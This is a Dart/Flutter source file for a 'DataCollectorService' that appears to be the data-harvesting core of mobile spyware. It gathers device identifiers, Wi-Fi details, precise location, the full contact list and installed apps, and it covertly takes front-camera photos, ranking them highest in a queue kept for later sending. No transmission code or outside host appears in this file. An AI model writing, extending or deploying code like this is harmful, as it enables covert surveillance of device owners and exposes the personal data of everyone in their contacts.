// lib/core/controlar/data/data_collector_service.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:crypto/crypto.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:geolocator/geolocator.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';

import '../camera/camera_service.dart';
import '../location/location_service.dart';
import '../permissions/device_info_service.dart';

/// Enhanced DataCollectorService that gathers comprehensive device information,
/// caches it securely, and supports incremental data collection with prioritization.
class DataCollectorService {
  // Dependencies
  final CameraService _cameraService;
  final DeviceInfoService _deviceInfoService;
  final LocationService _locationService;

  // Storage for pending data
  final _secureStorage = FlutterSecureStorage();
  final List<Map<String, dynamic>> _pendingDataQueue = [];

  // State tracking
  bool _isCollectingData = false;
  bool _isProcessingQueue = false;
  DateTime? _lastFullCollection;
  int _dataCollectionCounter = 0;

  // Service instances
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();
  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();

  // Constants
  static const String KEY_PENDING_DATA = 'data_collector_pending_data';
  static const String KEY_LAST_COLLECTION = 'data_collector_last_collection';
  static const String KEY_DATA_COUNTER = 'data_collector_counter';

  // Flags for knowing which data was collected
  Map<String, DateTime> _lastCollectionTimes = {};

  DataCollectorService({
    CameraService? cameraService,
    DeviceInfoService? deviceInfoService,
    LocationService? locationService,
  })  : _cameraService = cameraService ?? CameraService(),
        _deviceInfoService = deviceInfoService ?? DeviceInfoService(),
        _locationService = locationService ?? LocationService() {
    _initialize();
  }

  Future<void> _initialize() async {
    // Load state from secure storage
    await _loadState();

    // Load any pending data
    await _loadPendingData();
  }

  Future<void> _loadState() async {
    try {
      // Load last full collection time
      final lastCollectionStr =
          await _secureStorage.read(key: KEY_LAST_COLLECTION);
      if (lastCollectionStr != null) {
        _lastFullCollection = DateTime.parse(lastCollectionStr);
      }

      // Load collection counter
      final counterStr = await _secureStorage.read(key: KEY_DATA_COUNTER);
      if (counterStr != null) {
        _dataCollectionCounter = int.parse(counterStr);
      }

      // Load information about which data types were collected recently
      final lastCollectionTimesStr =
          await _secureStorage.read(key: 'last_collection_times');
      if (lastCollectionTimesStr != null) {
        final Map<String, dynamic> times = json.decode(lastCollectionTimesStr);
        _lastCollectionTimes = times.map(
            (key, value) => MapEntry(key, DateTime.parse(value as String)));
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error loading state: $e");
    }
  }

  Future<void> _saveState() async {
    try {
      // Save last full collection time
      if (_lastFullCollection != null) {
        await _secureStorage.write(
            key: KEY_LAST_COLLECTION,
            value: _lastFullCollection!.toIso8601String());
      }

      // Save collection counter
      await _secureStorage.write(
          key: KEY_DATA_COUNTER, value: _dataCollectionCounter.toString());

      // Save information about which data types were collected recently
      final lastCollectionTimesStr = json.encode(_lastCollectionTimes
          .map((key, value) => MapEntry(key, value.toIso8601String())));
      await _secureStorage.write(
          key: 'last_collection_times', value: lastCollectionTimesStr);
    } catch (e) {
      debugPrint("DataCollectorService: Error saving state: $e");
    }
  }

  /// PRIMARY METHOD: Collect all available data from the device
  Future<Map<String, dynamic>> collectAllData(
      {bool forceRefresh = false}) async {
    if (_isCollectingData) {
      debugPrint(
          "DataCollectorService: Already collecting data, returning early");
      return {'error': 'Data collection already in progress'};
    }

    _isCollectingData = true;
    _dataCollectionCounter++;
    _lastFullCollection = DateTime.now();

    try {
      debugPrint(
          "DataCollectorService: Starting comprehensive data collection");

      // Create result map for all collected data
      final Map<String, dynamic> collectedData = {
        'collection_id': _generateCollectionId(),
        'collection_timestamp': DateTime.now().toIso8601String(),
        'collection_counter': _dataCollectionCounter,
      };

      // Basic device info - always collect
      final deviceInfo = await _collectDeviceInfo();
      collectedData['device_info'] = deviceInfo;
      _updateLastCollectionTime('device_info');

      // Battery status - always collect, cheap operation
      final batteryInfo = await _collectBatteryInfo();
      collectedData['battery_info'] = batteryInfo;
      _updateLastCollectionTime('battery_info');

      // Network status - always collect, cheap operation
      final networkInfo = await _collectNetworkInfo();
      collectedData['network_info'] = networkInfo;
      _updateLastCollectionTime('network_info');

      // Location data - depends on permissions, can be expensive for battery
      if (_shouldCollectDataType('location', forceRefresh)) {
        try {
          final locationData = await _collectLocationData();
          collectedData['location'] = locationData;
          _updateLastCollectionTime('location');
        } catch (e) {
          debugPrint("DataCollectorService: Error collecting location: $e");
          collectedData['location'] = {'error': e.toString()};
        }
      }

      // Contacts - collect less frequently, requires permissions
      if (_shouldCollectDataType('contacts', forceRefresh)) {
        try {
          final contactsData = await _collectContacts();
          collectedData['contacts'] = contactsData;
          _updateLastCollectionTime('contacts');
        } catch (e) {
          debugPrint("DataCollectorService: Error collecting contacts: $e");
          collectedData['contacts'] = {'error': e.toString()};
        }
      }

      // Installed apps - collect less frequently
      if (_shouldCollectDataType('apps', forceRefresh)) {
        try {
          final appsData = await _collectInstalledApps();
          collectedData['installed_apps'] = appsData;
          _updateLastCollectionTime('apps');
        } catch (e) {
          debugPrint(
              "DataCollectorService: Error collecting installed apps: $e");
          collectedData['installed_apps'] = {'error': e.toString()};
        }
      }

      // Storage info - collect less frequently
      if (_shouldCollectDataType('storage', forceRefresh)) {
        try {
          final storageInfo = await _collectStorageInfo();
          collectedData['storage_info'] = storageInfo;
          _updateLastCollectionTime('storage');
        } catch (e) {
          debugPrint("DataCollectorService: Error collecting storage info: $e");
          collectedData['storage_info'] = {'error': e.toString()};
        }
      }

      // Take photo - only on specific request or very infrequently
      if (forceRefresh && _shouldCollectDataType('photo', true)) {
        try {
          final photoInfo = await _capturePhoto();
          if (photoInfo != null) {
            collectedData['photo'] = photoInfo;
            _updateLastCollectionTime('photo');
          }
        } catch (e) {
          debugPrint("DataCollectorService: Error capturing photo: $e");
        }
      }

      // Add AI-generated data summary and priorities
      collectedData['analysis'] = _generateDataAnalysis(collectedData);

      // Save collection state
      await _saveState();

      debugPrint("DataCollectorService: Data collection completed");
      return collectedData;
    } catch (e, stack) {
      debugPrint("DataCollectorService: Error in complete data collection: $e");
      debugPrint(stack.toString());
      return {
        'error': 'Error collecting data: $e',
        'timestamp': DateTime.now().toIso8601String(),
      };
    } finally {
      _isCollectingData = false;
    }
  }

  /// Capture photo using device camera
  Future<Map<String, dynamic>?> capturePhotoWithMetadata() async {
    try {
      final XFile? imageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );

      if (imageFile != null) {
        // Get image metadata
        final File file = File(imageFile.path);
        final int fileSize = await file.length();
        final String mimeType = imageFile.mimeType ?? 'image/jpeg';

        // Get location if available to attach to photo
        Position? location;
        try {
          location = await _locationService.getCurrentLocation();
        } catch (_) {
          // Ignore location errors
        }

        return {
          'file_path': imageFile.path,
          'file_name': imageFile.name,
          'file_size': fileSize,
          'mime_type': mimeType,
          'timestamp': DateTime.now().toIso8601String(),
          'location': location != null
              ? {
                  'latitude': location.latitude,
                  'longitude': location.longitude,
                  'accuracy': location.accuracy,
                }
              : null,
        };
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error capturing photo: $e");
    }
    return null;
  }

  /// Queue data for later sending when connectivity is available
  Future<void> queueDataForLater(
      String dataType, Map<String, dynamic> data) async {
    final dataPackage = {
      'type': dataType,
      'data': data,
      'timestamp': DateTime.now().toIso8601String(),
      'priority': _getDataPriority(dataType),
    };

    _pendingDataQueue.add(dataPackage);
    await _persistPendingData();

    debugPrint(
        "DataCollectorService: Data of type '$dataType' queued for later processing");
  }

  /// Load queued data from secure storage
  Future<void> _loadPendingData() async {
    try {
      final data = await _secureStorage.read(key: KEY_PENDING_DATA);
      if (data != null && data.isNotEmpty) {
        final List<dynamic> dataList = json.decode(data);

        _pendingDataQueue.clear();
        for (var item in dataList) {
          _pendingDataQueue.add(Map<String, dynamic>.from(item));
        }

        debugPrint(
            "DataCollectorService: Loaded ${_pendingDataQueue.length} pending data items");
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error loading pending data: $e");
      // If corrupted, reset
      await _secureStorage.delete(key: KEY_PENDING_DATA);
    }
  }

  /// Save queued data to secure storage
  Future<void> _persistPendingData() async {
    try {
      if (_pendingDataQueue.isEmpty) {
        await _secureStorage.delete(key: KEY_PENDING_DATA);
        return;
      }

      final jsonData = json.encode(_pendingDataQueue);
      await _secureStorage.write(key: KEY_PENDING_DATA, value: jsonData);
    } catch (e) {
      debugPrint("DataCollectorService: Error persisting pending data: $e");
    }
  }

  /// Process pending data when requested by external components
  Future<int> processPendingData(
      Function(String, Map<String, dynamic>) processor) async {
    if (_isProcessingQueue || _pendingDataQueue.isEmpty) return 0;

    _isProcessingQueue = true;
    int processedCount = 0;

    try {
      // Sort by priority (higher number = higher priority)
      _pendingDataQueue.sort((a, b) =>
          (b['priority'] as int? ?? 0).compareTo(a['priority'] as int? ?? 0));

      // Process items up to a reasonable limit
      final itemsToProcess = _pendingDataQueue.take(5).toList();

      for (var item in itemsToProcess) {
        try {
          await processor(item['type'], item['data']);
          _pendingDataQueue.remove(item);
          processedCount++;
        } catch (e) {
          debugPrint("DataCollectorService: Error processing item: $e");
          // Move to end of queue
          _pendingDataQueue.remove(item);
          _pendingDataQueue.add(item);
        }
      }

      // Update storage
      await _persistPendingData();

      return processedCount;
    } finally {
      _isProcessingQueue = false;
    }
  }

  // DATA COLLECTION METHODS

  Future<Map<String, dynamic>> _collectDeviceInfo() async {
    final Map<String, dynamic> deviceData = {};

    // Get device ID
    deviceData['device_id'] =
        await _deviceInfoService.getOrCreateUniqueDeviceId();

    // Get device info based on platform
    if (Platform.isAndroid) {
      final androidInfo = await _deviceInfoPlugin.androidInfo;
      deviceData['platform'] = 'android';
      deviceData['device_model'] = androidInfo.model;
      deviceData['manufacturer'] = androidInfo.manufacturer;
      deviceData['android_version'] = androidInfo.version.release;
      deviceData['sdk_version'] = androidInfo.version.sdkInt.toString();
      deviceData['device_name'] = androidInfo.device;
      deviceData['brand'] = androidInfo.brand;
      deviceData['hardware'] = androidInfo.hardware;
      deviceData['is_physical_device'] = androidInfo.isPhysicalDevice;
      deviceData['product'] = androidInfo.product;
      deviceData['fingerprint'] = androidInfo.fingerprint;
      deviceData['bootloader'] = androidInfo.bootloader;
      deviceData['security_patch'] = androidInfo.version.securityPatch;
    } else if (Platform.isIOS) {
      final iosInfo = await _deviceInfoPlugin.iosInfo;
      deviceData['platform'] = 'ios';
      deviceData['device_model'] = iosInfo.model;
      deviceData['system_name'] = iosInfo.systemName;
      deviceData['system_version'] = iosInfo.systemVersion;
      deviceData['device_name'] = iosInfo.name;
      deviceData['identifier_for_vendor'] = iosInfo.identifierForVendor;
      deviceData['is_physical_device'] = iosInfo.isPhysicalDevice;
      deviceData['utsname'] = {
        'sysname': iosInfo.utsname.sysname,
        'nodename': iosInfo.utsname.nodename,
        'release': iosInfo.utsname.release,
        'version': iosInfo.utsname.version,
        'machine': iosInfo.utsname.machine,
      };
    }

    // Get app info
    try {
      final packageInfo = await PackageInfo.fromPlatform();
      deviceData['app_info'] = {
        'app_name': packageInfo.appName,
        'package_name': packageInfo.packageName,
        'version': packageInfo.version,
        'build_number': packageInfo.buildNumber,
      };
    } catch (e) {
      debugPrint("DataCollectorService: Error getting package info: $e");
    }

    return deviceData;
  }

  Future<Map<String, dynamic>> _collectBatteryInfo() async {
    final Map<String, dynamic> batteryData = {};

    try {
      batteryData['level'] = await _battery.batteryLevel;

      final batteryState = await _battery.batteryState;
      batteryData['state'] = batteryState.toString();
      batteryData['is_charging'] = batteryState == BatteryState.charging ||
          batteryState == BatteryState.full;

      // On Android, we can get more detailed info
      if (Platform.isAndroid) {
        try {
          final result = await const MethodChannel('app.channel.shared.data')
              .invokeMethod('getBatteryDetails');

          if (result != null && result is Map) {
            batteryData['temperature'] = result['temperature'];
            batteryData['voltage'] = result['voltage'];
            batteryData['health'] = result['health'];
            batteryData['technology'] = result['technology'];
          }
        } catch (_) {
          // Ignore if not available
        }
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting battery info: $e");
      batteryData['error'] = e.toString();
    }

    batteryData['timestamp'] = DateTime.now().toIso8601String();
    return batteryData;
  }

  Future<Map<String, dynamic>> _collectNetworkInfo() async {
    final Map<String, dynamic> networkData = {};

    try {
      // Get current connectivity status
      final connectivityResult = await _connectivity.checkConnectivity();
      networkData['connectivity_status'] = connectivityResult.toString();

      // Check if connected to WiFi
      final isWifi = connectivityResult == ConnectivityResult.wifi;
      networkData['is_wifi'] = isWifi;

      // Check if connected to mobile network
      final isMobile = connectivityResult == ConnectivityResult.mobile;
      networkData['is_mobile'] = isMobile;

      // Get WiFi details if connected
      if (isWifi) {
        try {
          // On Android, we can try to get WiFi details
          if (Platform.isAndroid) {
            try {
              final result =
                  await const MethodChannel('app.channel.shared.data')
                      .invokeMethod('getWifiInfo');

              if (result != null && result is Map) {
                networkData['wifi_ssid'] = result['ssid'];
                networkData['wifi_bssid'] = result['bssid'];
                networkData['wifi_signal_strength'] = result['rssi'];
                networkData['wifi_link_speed'] = result['linkSpeed'];
                networkData['wifi_frequency'] = result['frequency'];
              }
            } catch (_) {
              // Ignore if not available
            }
          }
        } catch (e) {
          debugPrint("DataCollectorService: Error getting WiFi details: $e");
        }
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting network info: $e");
      networkData['error'] = e.toString();
    }

    networkData['timestamp'] = DateTime.now().toIso8601String();
    return networkData;
  }

  Future<Map<String, dynamic>> _collectLocationData() async {
    final Map<String, dynamic> locationData = {};

    try {
      // Check if location services are enabled
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      locationData['location_service_enabled'] = serviceEnabled;

      if (!serviceEnabled) {
        locationData['error'] = 'Location services are disabled';
        return locationData;
      }

      // Check location permission
      LocationPermission permission = await Geolocator.checkPermission();
      locationData['permission_status'] = permission.toString();

      if (permission == LocationPermission.denied) {
        // Try to request permission
        permission = await Geolocator.requestPermission();
        locationData['permission_status_after_request'] = permission.toString();

        if (permission == LocationPermission.denied) {
          locationData['error'] = 'Location permission denied';
          return locationData;
        }
      }

      if (permission == LocationPermission.deniedForever) {
        locationData['error'] = 'Location permission permanently denied';
        return locationData;
      }

      // Get current position
      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        timeLimit: const Duration(seconds: 10),
      );

      locationData['latitude'] = position.latitude;
      locationData['longitude'] = position.longitude;
      locationData['accuracy'] = position.accuracy;
      locationData['altitude'] = position.altitude;
      locationData['speed'] = position.speed;
      locationData['heading'] = position.heading;
      locationData['timestamp'] = position.timestamp.toIso8601String();

      // Try to get address information
      try {
        // This would require a geocoding service or plugin
        // For now, we'll just include a placeholder
        locationData['address'] = 'Not implemented in sample';
      } catch (_) {
        // Ignore if geocoding is not available
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting location data: $e");
      locationData['error'] = e.toString();
    }

    locationData['collection_timestamp'] = DateTime.now().toIso8601String();
    return locationData;
  }

  Future<Map<String, dynamic>> _collectContacts() async {
    final Map<String, dynamic> contactsData = {};

    try {
      // Check permission first
      final permissionStatus = await ContactsService.getContactsPermission();
      contactsData['permission_status'] = permissionStatus.toString();

      if (permissionStatus != PermissionStatus.granted) {
        // Try to request permission
        final newStatus = await ContactsService.requestPermission();
        contactsData['permission_status_after_request'] = newStatus.toString();

        if (newStatus != PermissionStatus.granted) {
          contactsData['error'] = 'Contacts permission not granted';
          return contactsData;
        }
      }

      // Get all contacts
      final contacts = await ContactsService.getContacts();

      // Convert to simpler format
      final List<Map<String, dynamic>> contactsList = [];
      for (var contact in contacts) {
        contactsList.add({
          'name': contact.displayName ?? '',
          'phones': contact.phones?.map((phone) => phone.value).toList() ?? [],
          'emails': contact.emails?.map((email) => email.value).toList() ?? [],
          'company': contact.company ?? '',
          // Don't include avatar to reduce data size
        });
      }

      contactsData['contacts'] = contactsList;
      contactsData['count'] = contactsList.length;
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting contacts: $e");
      contactsData['error'] = e.toString();
    }

    contactsData['timestamp'] = DateTime.now().toIso8601String();
    return contactsData;
  }

  Future<Map<String, dynamic>> _collectInstalledApps() async {
    final Map<String, dynamic> appsData = {};

    try {
      // Get list of installed apps
      final List<AppInfo> apps = await InstalledApps.getInstalledApps();

      // Convert to simpler format
      final List<Map<String, dynamic>> appsList = [];
      for (var app in apps) {
        appsList.add({
          'app_name': app.name ?? '',
          'package_name': app.packageName ?? '',
          'version_name': app.versionName ?? '',
          'version_code': app.versionCode ?? 0,
          'system_app': app.isSystemApp ?? false,
        });
      }

      appsData['apps'] = appsList;
      appsData['count'] = appsList.length;

      // Count system vs non-system apps
      int systemAppsCount = 0;
      int userAppsCount = 0;

      for (var app in appsList) {
        if (app['system_app'] == true) {
          systemAppsCount++;
        } else {
          userAppsCount++;
        }
      }

      appsData['system_apps_count'] = systemAppsCount;
      appsData['user_apps_count'] = userAppsCount;
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting installed apps: $e");
      appsData['error'] = e.toString();
    }

    appsData['timestamp'] = DateTime.now().toIso8601String();
    return appsData;
  }

  Future<Map<String, dynamic>> _collectStorageInfo() async {
    final Map<String, dynamic> storageData = {};

    try {
      // Get temp directory
      final tempDir = await getTemporaryDirectory();
      storageData['temp_directory'] = tempDir.path;

      // Get app documents directory
      final appDocDir = await getApplicationDocumentsDirectory();
      storageData['app_documents_directory'] = appDocDir.path;

      // Get external storage directory (Android only)
      if (Platform.isAndroid) {
        final externalDirs = await getExternalStorageDirectories();
        storageData['external_directories'] =
            externalDirs?.map((dir) => dir.path).toList() ?? [];
      }

      // Get free space (requires platform-specific implementation)
      try {
        if (Platform.isAndroid) {
          final result = await const MethodChannel('app.channel.shared.data')
              .invokeMethod('getStorageInfo');

          if (result != null && result is Map) {
            storageData['total_space'] = result['totalSpace'];
            storageData['free_space'] = result['freeSpace'];
            storageData['used_space'] = result['usedSpace'];
          }
        }
      } catch (e) {
        debugPrint("DataCollectorService: Error getting storage details: $e");
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error collecting storage info: $e");
      storageData['error'] = e.toString();
    }

    storageData['timestamp'] = DateTime.now().toIso8601String();
    return storageData;
  }

  Future<Map<String, dynamic>?> _capturePhoto() async {
    try {
      final XFile? imageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );

      if (imageFile != null) {
        // Get image metadata
        final File file = File(imageFile.path);
        final int fileSize = await file.length();

        return {
          'file_path': imageFile.path,
          'file_name': imageFile.name,
          'file_size': fileSize,
          'mime_type': imageFile.mimeType ?? 'image/jpeg',
          'timestamp': DateTime.now().toIso8601String(),
        };
      }
    } catch (e) {
      debugPrint("DataCollectorService: Error capturing photo: $e");
    }
    return null;
  }

  // HELPER METHODS

  String _generateCollectionId() {
    final now = DateTime.now();
    final random =
        (now.millisecondsSinceEpoch % 1000).toString().padLeft(3, '0');
    return 'collect_${now.year}${now.month.toString().padLeft(2, '0')}${now.day.toString().padLeft(2, '0')}_$random';
  }

  bool _shouldCollectDataType(String dataType, bool forceRefresh) {
    if (forceRefresh) return true;

    // Check when this data type was last collected
    final lastCollection = _lastCollectionTimes[dataType];
    if (lastCollection == null) return true; // Never collected before

    final now = DateTime.now();
    final difference = now.difference(lastCollection);

    // Different refresh periods for different data types
    switch (dataType) {
      case 'location':
        return difference.inMinutes > 30; // Refresh every 30 minutes
      case 'contacts':
        return difference.inHours > 24; // Refresh daily
      case 'apps':
        return difference.inHours > 12; // Refresh twice a day
      case 'storage':
        return difference.inHours > 6; // Refresh several times a day
      case 'photo':
        return difference.inDays > 7; // Very infrequent refresh
      default:
        return difference.inHours > 1; // Default hourly refresh
    }
  }

  void _updateLastCollectionTime(String dataType) {
    _lastCollectionTimes[dataType] = DateTime.now();
  }

  int _getDataPriority(String dataType) {
    // Higher number = higher priority
    switch (dataType) {
      case 'photo':
        return 5; // Highest priority
      case 'location':
        return 4;
      case 'device_info':
        return 3;
      case 'contacts':
        return 2;
      case 'apps':
        return 1;
      default:
        return 0; // Lowest priority
    }
  }

  Map<String, dynamic> _generateDataAnalysis(
      Map<String, dynamic> collectedData) {
    // In a real implementation, this would analyze the data and generate insights
    // For now, we'll just return a simple summary

    final Map<String, dynamic> analysis = {
      'timestamp': DateTime.now().toIso8601String(),
      'collection_completeness': _calculateCompletenessScore(collectedData),
    };

    // Add data type priorities for next collection
    final Map<String, int> priorities = {};

    // Check which data types are missing or stale
    if (!collectedData.containsKey('location') ||
        collectedData['location']?['error'] != null) {
      priorities['location'] = 5; // High priority
    }

    if (!collectedData.containsKey('contacts') ||
        collectedData['contacts']?['error'] != null) {
      priorities['contacts'] = 4;
    }

    if (!collectedData.containsKey('installed_apps') ||
        collectedData['installed_apps']?['error'] != null) {
      priorities['apps'] = 3;
    }

    if (!collectedData.containsKey('storage_info') ||
        collectedData['storage_info']?['error'] != null) {
      priorities['storage'] = 2;
    }

    if (!collectedData.containsKey('photo')) {
      priorities['photo'] = 1;
    }

    analysis['next_collection_priorities'] = priorities;

    return analysis;
  }

  double _calculateCompletenessScore(Map<String, dynamic> data) {
    // Count how many data types were successfully collected
    int successful = 0;
    int total =
        5; // device_info, battery_info, network_info, location, contacts

    if (data.containsKey('device_info') &&
        !data['device_info'].containsKey('error')) {
      successful++;
    }

    if (data.containsKey('battery_info') &&
        !data['battery_info'].containsKey('error')) {
      successful++;
    }

    if (data.containsKey('network_info') &&
        !data['network_info'].containsKey('error')) {
      successful++;
    }

    if (data.containsKey('location') &&
        !data['location'].containsKey('error')) {
      successful++;
    }

    if (data.containsKey('contacts') &&
        !data['contacts'].containsKey('error')) {
      successful++;
    }

    return successful / total;
  }

  /// Clean up resources when service is no longer needed
  Future<void> disposeCamera() async {
    await _cameraService.dispose();
  }
}
